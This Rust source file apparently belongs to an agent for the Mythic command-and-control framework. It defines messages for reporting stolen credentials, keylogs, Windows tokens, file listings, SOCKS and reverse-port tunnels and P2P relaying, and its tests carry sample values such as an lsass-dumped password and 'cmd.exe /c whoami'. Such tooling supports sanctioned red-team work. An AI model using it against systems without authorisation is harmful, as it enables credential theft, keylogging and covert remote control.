#[derive(Clone, Copy, Serialize, PartialEq, Eq, Default)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct ProcessItem<'a> {
    /// 进程 PID
    pub process_id: u32,
    /// 进程映像名 (如 "svchost.exe")
    pub name: &'a str,
    /// 父进程 PID (用于建立进程树拓扑)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub parent_process_id: Option<u32>,
    /// 架构 (如 "x64" / "x86")
    #[serde(skip_serializing_if = "Option::is_none")]
    pub architecture: Option<&'a str>,
    /// 磁盘绝对二进制路径
    #[serde(skip_serializing_if = "Option::is_none")]
    pub bin_path: Option<&'a str>,
    /// 进程所属用户名
    #[serde(skip_serializing_if = "Option::is_none")]
    pub user: Option<&'a str>,
    /// 启动命令行
    #[serde(skip_serializing_if = "Option::is_none")]
    pub command_line: Option<&'a str>,
    /// Windows 完整性级别 (1: Low, 2: Med, 3: High, 4: SYSTEM)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub integrity_level: Option<u8>,
    /// 启动时间 (Unix 毫秒时间戳)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub start_time: Option<u64>,
    /// 进程描述文本
    #[serde(skip_serializing_if = "Option::is_none")]
    pub description: Option<&'a str>,
    /// 数字签名信息
    #[serde(skip_serializing_if = "Option::is_none")]
    pub signer: Option<&'a str>,
    /// Windows 保护进程级别 (Protected Process Light / PPL)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub protected_process_level: Option<u8>,
}

// ==========================================
// 7. Hooking Features: File Browser (文件浏览器)
// ==========================================

/// 文件目录结构回显外壳 (File Browser)
///
/// 对应官方文档: /customizing/hooking-features/file-browser
#[derive(Clone, Copy, Serialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct FileBrowserResponse<'a> {
    /// 目标计算机名 (省略时继承 callback host)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub host: Option<&'a str>,
    /// 本身是否为文件 (若是目录则为 false)
    pub is_file: bool,
    /// 目录/文件显示名称 (纯文件名，非绝对路径)
    pub name: &'a str,
    /// 父级目录绝对路径 (根路径如 "C:\\" 时为 null/空)
    pub parent_path: &'a str,
    /// 是否成功列出
    pub success: bool,
    /// 访问时间 (Unix 毫秒时间戳)
    pub access_time: u64,
    /// 修改时间 (Unix 毫秒时间戳)
    pub modify_time: u64,
    /// 文件大小 (字节)
    pub size: u64,
    /// 若为 true，更新并清理已删除文件
    #[serde(skip_serializing_if = "Option::is_none")]
    pub update_deleted: Option<bool>,
    /// 通知 Mythic 自动将结构体序列化后赋给 user_output (Mythic 3.3.1+)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub set_as_user_output: Option<bool>,
    /// 目录下的子文件/子文件夹切片
    pub files: &'a [FileBrowserChildItem<'a>],
}

/// 目录内子条目详情
#[derive(Clone, Copy, Serialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct FileBrowserChildItem<'a> {
    pub is_file: bool,
    pub name: &'a str,
    pub access_time: u64,
    pub modify_time: u64,
    pub size: u64,
}

/// 文件删除同步挂载项 (File Browser 划线删除同步)
///
/// 对应官方规范: "removed_files": [ { "host": "...", "path": "..." } ]
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct RemovedFileItem<'a> {
    /// 目标主机名称
    #[serde(borrow)]
    pub host: &'a str,
    /// 被删除文件或目录的绝对路径
    #[serde(borrow)]
    pub path: &'a str,
}

impl<'a> RemovedFileItem<'a> {
    #[inline]
    pub fn new(host: &'a str, path: &'a str) -> Self {
        Self { host, path }
    }
}

// ==========================================
// 8. Hooking Features: Credentials & Artifacts (凭据与审计痕迹)
// ==========================================

/// 凭据上报条目 (Credentials)
///
/// 对应官方文档: /customizing/hooking-features/credentials
#[derive(Clone, Copy, Serialize, PartialEq, Eq, Default)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct CredentialItem<'a> {
    /// 凭据类别 (如 "plaintext", "hash", "certificate", "key", "ticket", "jwt")
    pub credential_type: &'a str,
    /// 凭据子类型 (如 "ntlm", "access-token")
    #[serde(skip_serializing_if = "Option::is_none")]
    pub credential_subtype: Option<&'a str>,
    /// 认证域/领域 (如 "CORP.LOCAL" 或 "api.test")
    #[serde(skip_serializing_if = "Option::is_none")]
    pub realm: Option<&'a str>,
    /// 用户名/账号 (如 "Administrator")
    #[serde(skip_serializing_if = "Option::is_none")]
    pub account: Option<&'a str>,
    /// 凭据实体秘密值 (密码、Hash 或密钥串)
    pub credential: &'a str,
    /// 操作员备注
    #[serde(skip_serializing_if = "Option::is_none")]
    pub comment: Option<&'a str>,
    /// UI 显示覆盖文本
    #[serde(skip_serializing_if = "Option::is_none")]
    pub custom_display: Option<&'a str>,
}

/// 痕迹清理与审计条目 (Artifacts)
///
/// 对应官方文档: /customizing/hooking-features/artifacts
#[derive(Clone, Copy, Serialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct ArtifactItem<'a> {
    /// 基础痕迹类型 (如 "Process Create", "File Write")
    pub base_artifact: &'a str,
    /// 痕迹内容 (如 "powershell.exe -enc ...")
    pub artifact: &'a str,
    /// 行动结束后是否需要清理
    #[serde(skip_serializing_if = "Option::is_none")]
    pub needs_cleanup: Option<bool>,
    /// 是否已被当前任务清理完毕
    #[serde(skip_serializing_if = "Option::is_none")]
    pub resolved: Option<bool>,
}

// ==========================================
// 9. Hooking Features: Windows Tokens (访问令牌)
// ==========================================

/// Windows 访问令牌条目 (Tokens)
///
/// 对应官方文档: /customizing/hooking-features/tokens
#[derive(Clone, Copy, Serialize, PartialEq, Eq, Default)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct TokenItem<'a> {
    /// Agent 生成的全局令牌 ID
    pub token_id: u32,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub host: Option<&'a str>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub user: Option<&'a str>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub description: Option<&'a str>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub groups: Option<&'a str>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub thread_id: Option<u32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub process_id: Option<u32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub session_id: Option<u32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub restricted: Option<bool>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub privileges: Option<&'a str>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub handle: Option<u64>,
}

/// 回调当前持有的可用令牌动作
#[derive(Clone, Copy, Serialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct CallbackTokenItem<'a> {
    /// 动作标志: "add" 或 "remove"
    pub action: &'a str,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub host: Option<&'a str>,
    pub token_id: u32,
}

// ==========================================
// 10. Hooking Features: Keylogs & Alerts (键盘记录与告警)
// ==========================================

/// 键盘记录上报条目 (Keylog)
///
/// 对应官方文档: /customizing/hooking-features/keylog
#[derive(Clone, Copy, Serialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct KeylogItem<'a> {
    /// 按键所属用户名
    pub user: &'a str,
    /// 捕获按键时的活动前台窗口标题
    pub window_title: &'a str,
    /// 击键字符文本
    pub keystrokes: &'a str,
}

/// 操作事件告警条目 (Alerts)
///
/// 对应官方文档: /customizing/hooking-features/alerts
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct AlertMsg<'a> {
    /// 告警内容字符串
    #[serde(borrow)]
    pub alert: &'a str,
    /// 告警产生源标识 (用于 UI 折叠去重)
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub source: Option<&'a str>,
    /// 严重等级 ("info", "warning", "debug", "api")
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub level: Option<&'a str>,
    /// 是否强制推送 Webhook 告警 (默认 false)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub send_webhook: Option<bool>,
}

// ==========================================
// 11. Channels & Tunnels: SOCKS, RPFWD, Interactive & P2P Delegates
// ==========================================

/// SOCKS5 代理通信帧
///
/// 对应官方文档: /customizing/payload-type-development/create_tasking/agent-side-coding/socks
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct SocksMsg<'a> {
    /// 连接是否已断开 (若为 true 则通知对方关闭 TCP 套接字)
    pub exit: bool,
    /// 唯一 TCP 连接跟踪 ID
    pub server_id: u32,
    /// 传输的 Base64 原始数据 (exit 为 true 时可为空)
    #[serde(borrow)]
    pub data: &'a str,
}

/// 反向端口转发通信帧 (RPFWD)
///
/// 对应官方文档: /customizing/payload-type-development/create_tasking/agent-side-coding/rpfwd
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct RpfwdMsg<'a> {
    pub exit: bool,
    pub server_id: u32,
    #[serde(borrow)]
    pub data: &'a str,
    /// Agent 本地监听的端口 (用于区分多个并发 rpfwd 任务)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub port: Option<u32>,
}

/// 交互式终端 / 文件编辑器交互报文
///
/// 对应官方文档: /customizing/payload-type-development/create_tasking/agent-side-coding/8.-interactive-tasking
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct InteractiveMsg<'a> {
    #[serde(borrow)]
    pub task_id: &'a str,
    /// Base64 编码的终端输入输出字节
    #[serde(borrow)]
    pub data: &'a str,
    /// 消息类型代号 (0: Input, 1: Output, 2: Error, 3: Exit, 4: Escape, 100~102: FileEditor)
    pub message_type: u32,
}

/// 交互式终端控制码与文件编辑器常量
pub mod interactive_types {
    pub const INPUT: u32 = 0;
    pub const OUTPUT: u32 = 1;
    pub const ERROR: u32 = 2;
    pub const EXIT: u32 = 3;
    pub const ESCAPE: u32 = 4;
    pub const CTRL_C: u32 = 7;
    pub const CTRL_D: u32 = 8;
    pub const CTRL_Z: u32 = 24;
    /// Mythic 4.0 专用文件编辑器请求 (Mythic -> Agent)
    pub const FILE_EDITOR_REQUEST: u32 = 100;
    /// Mythic 4.0 专用文件编辑器响应 (Agent -> Mythic)
    pub const FILE_EDITOR_RESPONSE: u32 = 101;
    /// Mythic 4.0 专用文件编辑器错误 (Agent -> Mythic)
    pub const FILE_EDITOR_ERROR: u32 = 102;
}

/// P2P 代理中继转发报文 (Delegates)
///
/// 对应官方文档: /customizing/payload-type-development/create_tasking/agent-side-coding/delegates
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct DelegateMessage<'a> {
    /// 承载的内层原始 AgentMessage 密文字符串
    #[serde(borrow)]
    pub message: &'a str,
    /// 中继链路所用的 C2 Profile 名称 (如 "smb" 或 "tcp")
    #[serde(borrow)]
    pub c2_profile: &'a str,
    /// Agent 跟踪该下游连接分配的 UUID
    #[serde(borrow)]
    pub uuid: &'a str,
    /// Mythic 回包中校正后的正式 Callback UUID (可选)
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub new_uuid: Option<&'a str>,
}

/// P2P 网络拓扑边缘连线 (Edges)
#[derive(Clone, Copy, Serialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct EdgeMsg<'a> {
    pub source: &'a str,
    pub destination: &'a str,
    pub c2_profile: &'a str,
    /// "add" 或 "remove"
    pub action: &'a str,
}

/// 异步 Agent RPC 请求挂载 (Mythic 4.0)
///
/// 对应官方文档: /customizing/payload-type-development/create_tasking/agent-side-coding/agent-rpc
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct AgentRpcRequest<'a> {
    /// RPC Hook 函数名称
    #[serde(borrow)]
    pub name: &'a str,
    /// 参数 JSON 文本
    #[serde(borrow)]
    pub arguments: &'a str,
}

// ==========================================
// 12. 单元测试验证模块
// ==========================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_checkin_serialization() {
        let ips = ["192.168.1.50", "10.0.0.5"];
        let msg = CheckinMessage::new(
            "12345678-1234-1234-1234-1234567890ab",
            &ips,
            "Windows 11 Pro",
            "SYSTEM",
            "VICTIM-PC",
            1234,
            "x64",
            "WORKGROUP",
        );
        assert!(msg.validate().is_ok());

        let json = serde_json::to_string(&msg).unwrap();
        assert!(json.contains(r#""action":"checkin""#));
        assert!(json.contains(r#""user":"SYSTEM""#));
        assert!(json.contains(r#""ips":["192.168.1.50","10.0.0.5"]"#));
        assert!(!json.contains(r#""ip":"#));
    }

    #[test]
    fn test_get_tasking_piggybacking() {
        let resp_item = TaskResponseItem::new("task-001", "whoami completed", true);
        let resp_slice = [resp_item];
        let edge = EdgeMsg {
            source: "node-a",
            destination: "node-b",
            action: "add",
            c2_profile: "smb",
        };
        let edges = [edge];

        let msg = GetTaskingMessage::new(1)
            .with_responses(&resp_slice)
            .with_edges(&edges);

        let json = serde_json::to_string(&msg).unwrap();
        assert!(json.contains(r#""action":"get_tasking""#));
        assert!(json.contains(r#""tasking_size":1"#));
        assert!(json.contains(r#""responses":[{"#));
        assert!(json.contains(r#""user_output":"whoami completed""#));
        assert!(json.contains(r#""edges":[{"#));
        assert!(json.contains(r#""c2_profile":"smb""#));
    }

    #[test]
    fn test_server_checkin_response_deserialization() {
        let raw = r#"{"action":"checkin","status":"success","id":"87654321-4321-4321-4321-ba0987654321"}"#;
        let resp: ServerCheckinResponse<'_> = serde_json::from_str(raw).unwrap();
        assert!(resp.validate().is_ok());
        assert_eq!(resp.id, Some("87654321-4321-4321-4321-ba0987654321"));

        let mut dest = [0u8; 36];
        assert_eq!(resp.copy_id_to(&mut dest), Ok(true));
        assert_eq!(&dest, b"87654321-4321-4321-4321-ba0987654321");
    }

    #[test]
    fn test_get_tasking_and_response() {
        let get_tasking = GetTaskingMessage::default();
        let json = serde_json::to_string(&get_tasking).unwrap();
        assert_eq!(json, r#"{"action":"get_tasking","tasking_size":1}"#);

        let raw_resp = r#"{
            "action": "get_tasking",
            "status": "success",
            "tasks": [
                {
                    "id": "task-uuid-001",
                    "command": "whoami",
                    "parameters": "/all",
                    "timestamp": 1728460000.5
                }
            ]
        }"#;
        let task_resp: ServerTaskingResponseRef<'_> = serde_json::from_str(raw_resp).unwrap();
        assert_eq!(task_resp.tasks.len(), 1);
        assert_eq!(task_resp.tasks[0].command, "whoami");
        assert_eq!(task_resp.tasks[0].parameters, "/all");
    }

    #[test]
    fn test_hooking_features_post_response() {
        let cred = CredentialItem {
            credential_type: "plaintext",
            credential_subtype: Some("password"),
            realm: Some("CORP.LOCAL"),
            account: Some("admin"),
            credential: "Password123!",
            comment: Some("dumped via lsass"),
            custom_display: None,
        };
        let creds = [cred];

        let artifact = ArtifactItem {
            base_artifact: "Process Create",
            artifact: "cmd.exe /c whoami",
            needs_cleanup: Some(false),
            resolved: Some(true),
        };
        let artifacts = [artifact];

        let removed = RemovedFileItem::new("VICTIM-PC", "C:\\Windows\\Temp\\beacon.bin");
        let removed_files = [removed];

        let mut item = TaskResponseItem::new("task-uuid-001", "success output", true);
        item.credentials = Some(&creds);
        item.artifacts = Some(&artifacts);
        item.removed_files = Some(&removed_files);

        let responses = [item];
        let post = PostResponseMessage::new(&responses);

        let json = serde_json::to_string(&post).unwrap();
        assert!(json.contains(r#""action":"post_response""#));
        assert!(json.contains(r#""task_id":"task-uuid-001""#));
        assert!(json.contains(r#""removed_files":[{"host":"VICTIM-PC","path":"C:\\Windows\\Temp\\beacon.bin"}]"#));

        // 测试 ServerPostResponse 反序列化及隧道流量
        let server_post_raw = r#"{
            "action": "post_response",
            "responses": [
                {
                    "task_id": "task-uuid-001",
                    "status": "success"
                }
            ],
            "socks": [
                {
                    "exit": false,
                    "server_id": 42,
                    "data": "QUJD"
                }
            ]
        }"#;
        let server_resp: ServerPostResponse<'_> = serde_json::from_str(server_post_raw).unwrap();
        assert_eq!(server_resp.action, "post_response");
        assert_eq!(server_resp.responses.len(), 1);
        assert_eq!(server_resp.responses[0].task_id, "task-uuid-001");
        assert!(server_resp.socks.is_some());
        assert_eq!(server_resp.socks.as_ref().unwrap().len(), 1);
        assert_eq!(server_resp.socks.as_ref().unwrap()[0].server_id, 42);
    }

    #[test]
    fn test_interactive_and_socks_structures() {
        let socks_raw = r#"{"exit":false,"server_id":123,"data":"SGVsbG8="}"#;
        let socks: SocksMsg<'_> = serde_json::from_str(socks_raw).unwrap();
        assert_eq!(socks.server_id, 123);
        assert_eq!(socks.data, "SGVsbG8=");

        let inter_raw = r#"{"task_id":"task-123","data":"dGVzdA==","message_type":100}"#;
        let inter: InteractiveMsg<'_> = serde_json::from_str(inter_raw).unwrap();
        assert_eq!(inter.message_type, interactive_types::FILE_EDITOR_REQUEST);
    }

    #[test]
    fn test_mythic_messages_padding_injection() {
        // 1. GetTaskingMessage 无 padding 序列化
        let mut tasking = GetTaskingMessage::default();
        let json_no_pad = serde_json::to_string(&tasking).unwrap();
        assert!(!json_no_pad.contains("\"_p\""));

        // 2. 注入切片 padding 序列化
        tasking = tasking.with_padding(Some("dummy_noise_12345"));
        let json_with_pad = serde_json::to_string(&tasking).unwrap();
        assert!(json_with_pad.contains(r#""_p":"dummy_noise_12345""#));

        // 3. PostResponseMessage 注入 padding 验证
        let resp_item = [TaskResponseItem::new("t-001", "dir output", true)];
        let post = PostResponseMessage::new(&resp_item).with_padding(Some("jitter_abc"));
        let json_post = serde_json::to_string(&post).unwrap();
        assert!(json_post.contains(r#""_p":"jitter_abc""#));
    }

    #[test]
    fn test_protocol_budget_constants() {
        assert_eq!(WIRE_SIZE_4K, 4096);
        assert_eq!(WIRE_SIZE_16K, 16384);
        assert_eq!(WIRE_SIZE_64K, 65536);

        assert_eq!(MAX_B64_LEN, ACTIVE_WIRE_SIZE);
        assert_eq!(MAX_RAW_LEN, crate::calc_raw_len(ACTIVE_WIRE_SIZE));
        assert_eq!(MAX_PLAINTEXT_LEN, crate::calc_max_plaintext_len(MAX_RAW_LEN));
        assert_eq!(PROTOCOL_OVERHEAD, 100);
        assert_eq!(MAX_RAW_LEN * 4 / 3, MAX_B64_LEN);

        assert_eq!(RAW_LEN_4K, 3072);
        assert_eq!(PLAINTEXT_LEN_4K, 2960);
        assert_eq!(RAW_READ_4K, 2106);

        assert_eq!(Budget4K::MAX_B64_LEN, 4096);
        assert_eq!(Budget4K::MAX_RAW_LEN, 3072);
        assert_eq!(Budget4K::MAX_PLAINTEXT_LEN, 2960);
        assert_eq!(Budget4K::MAX_RAW_READ, 2106);
        assert_eq!(Budget4K::MAX_RAW_READ % 3, 0);

        assert_eq!(Budget16K::MAX_B64_LEN, 16384);
        assert_eq!(Budget16K::MAX_RAW_LEN, 12288);
        assert_eq!(Budget16K::MAX_PLAINTEXT_LEN, 12176);
        assert_eq!(Budget16K::MAX_RAW_READ, 9018);
        assert_eq!(Budget16K::MAX_RAW_READ % 3, 0);

        assert_eq!(Budget64K::MAX_B64_LEN, 65536);
        assert_eq!(Budget64K::MAX_RAW_LEN, 49152);
        assert_eq!(Budget64K::MAX_PLAINTEXT_LEN, 49040);
        assert_eq!(Budget64K::MAX_RAW_READ, 36666);
        assert_eq!(Budget64K::MAX_RAW_READ % 3, 0);

        assert_eq!(DynamicBudget::Small.wire_size(), 4096);
        assert_eq!(DynamicBudget::Medium.wire_size(), 16384);
        assert_eq!(DynamicBudget::Large.wire_size(), 65536);

        let s1 = DynamicBudget::select_jittered_read(1000);
        assert!(s1 <= Budget4K::MAX_RAW_READ);
        assert_eq!(s1 % 3, 0);

        let s2 = DynamicBudget::select_jittered_read(5000);
        assert!(s2 <= Budget16K::MAX_RAW_READ);
        assert_eq!(s2 % 3, 0);

        let mut ws = StackWorkspace4K::new();
        ws.raw_buf[0] = 0xDE;
        ws.b64_buf[0] = 0xAD;
        ws.zeroize();
        assert_eq!(ws.raw_buf[0], 0);
        assert_eq!(ws.b64_buf[0], 0);
    }
}
